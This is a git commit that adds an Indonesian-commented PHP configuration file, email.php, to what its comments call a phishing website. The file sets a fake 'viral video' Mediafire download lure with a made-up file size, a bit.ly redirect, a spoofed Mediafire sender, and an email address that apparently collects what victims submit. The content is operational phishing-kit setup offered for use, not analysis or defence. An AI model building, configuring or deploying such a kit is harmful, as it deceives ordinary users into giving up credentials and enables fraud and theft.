78446f34d68a557009ee5d8991edd94f09f958cd
MINN RN <166360125+minnrn@users.noreply.github.com>
2024-04-21 10:09:02 +0800

    Add files via upload

---
+++ p2/email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://bit.ly/mediafire-terbaru'; // link mediafire asli/redirect
+$namaweb = 'Video Viral Terbaru'; // Ganti nama web phising mu di sini 
+$ukuran = '22.5MB'; // Ukuran download video
+
+$sender = 'From: Nextnesia - Mediafire <yumekodeveloper@gmail.com>'; //Nama Ress
+$email = "prof-ambatrom@exdonuts.com"; // Email kamu
+
+?>
